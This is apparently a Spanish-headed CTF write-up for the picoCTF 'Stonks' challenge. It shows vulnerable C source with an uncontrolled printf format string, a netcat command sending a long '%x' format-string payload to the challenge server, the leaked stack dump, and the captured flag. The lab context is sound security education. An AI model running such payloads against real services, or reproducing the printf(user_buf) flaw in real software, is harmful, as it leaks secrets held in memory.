## Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`
#### Hints
- Okay, maybe I'd believe you if you find my API key.
## Solución

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}

```

```shell
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/stonks]
└─$ (echo "1";echo "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x") | nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
8c3d350804b00080489c3f7ef0d80ffffffff18c3b160f7efe110f7ef0dc708c3c18018c3d3308c3d3506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ff8a007df7f2baf8f7efe440a775cb0010f7d8dce9f7eff0c0f7ef05c0f7ef0000ff8aabb8f7d7e68df7ef05c08048ecaff8aabc40f7f12f09804b000f7ef0000f7ef0e20ff8aabf8f7f18d50f7ef1890a775cb00f7ef0000804b000ff8aabf88048c868c3b160ff8aabe4ff8aabf88048be9f7ef03fc0ff8aacacff8aaca4118c3b160a775cb00ff8aac1000f7d33fa1f7ef0000f7ef00000f7d33fa11ff8aaca4ff8aacacff8aac3410f7ef0000f7f1370af7f2b0000f7ef000000191c0a42aa3aec52000180486300f7f18d50f7f13960804b00018048630080486628048b851ff8aaca48048cd08048d30f7f13960ff8aac9cf7f2b9401ff8aae770ff8aaeb0ff8aaebdff8aaec6ff8aaef5ff8aaf2dff8aaf49ff8aaf6bff8aaf73020f7f03b5021f7f0300010
Portfolio as of Mon Nov 11 17:04:58 UTC 2024


1 shares of I
38 shares of PRW
11 shares of JF
Goodbye!
              
```

![[Pasted image 20241111110548.png]]
## Bandera
```css
flag: picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
```
## Notas Adicionales

## Referencias
- 